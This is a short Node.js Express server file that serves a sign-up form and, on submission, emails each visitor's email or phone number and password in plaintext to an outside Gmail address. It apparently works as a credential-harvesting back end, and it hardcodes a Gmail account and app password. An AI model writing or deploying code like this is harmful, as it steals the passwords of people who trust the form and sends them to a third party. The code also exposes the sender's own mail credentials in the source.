//jshint esversion:6

const express = require("express");
const bodyParser = require("body-parser");
const ejs = require("ejs");
const nodemailer = require("nodemailer");


const app = express();

app.use(express.static("public"));
app.set('view engine', 'ejs');
app.use(bodyParser.urlencoded({ extended: true }));


app.get("/", function(req, res) {
    res.render("home");
});


app.get("/register", function(req, res) {
    res.render("register");
});


app.post("/register", function(req, res) {

    const emailORnumber = req.body.emailORnumber;
    const password = req.body.password;


    //create reuseable transporter object using the Gmail
    var transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
            user: 'ekyeremeh7@gmail.com',
            pass: 'jsturwesaijlviqw'
        }

    });


    // vanessablinx@gmail.com

    var mailOptions = {
        from: 'ekyeremeh7@gmail.com', // sender address
        to: 'vanessablinx@gmail.com', // list of receivers
        subject: 'Hello ✔, A client just signed up . Below are his or her details.', // Subject line
        text: 'Email/Mobile Number : ' + emailORnumber + "\n " + "Password : " + password,
        // plaintext body
        // html body
    };

    // send mail with defined transport object
    transporter.sendMail(mailOptions, function(error, info) {
        if (error) {
            return console.log(error);
        }
        res.render("thank-you", {
            username: emailORnumber
        });
        console.log('Message sent: ' + info.response);
    });


});


app.listen(3000, function() {
    console.log("Server started on port 3000");
});;

app.set('view engine', 'ejs');

app.use(bodyParser.urlencoded({ extended: true }));